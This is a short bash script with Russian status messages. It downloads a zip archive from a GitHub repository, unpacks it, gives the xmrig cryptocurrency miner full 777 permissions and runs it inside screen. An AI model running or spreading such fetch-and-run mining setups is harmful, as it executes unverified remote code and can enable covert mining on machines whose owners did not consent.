#!/bin/bash

apt-get update
apt install unzip
echo 'Создание папки'
mkdir s_mine
echo 'Переход в папку'
cd s_mine
echo 'Скачивание СУШИ'
wget https://github.com/Hentai624/1/raw/master/m.zip
echo 'Расспаковка'
unzip m
echo 'Выдача прав 777'
chmod 777 xmrig
echo 'SCREEN'
screen
./xmrig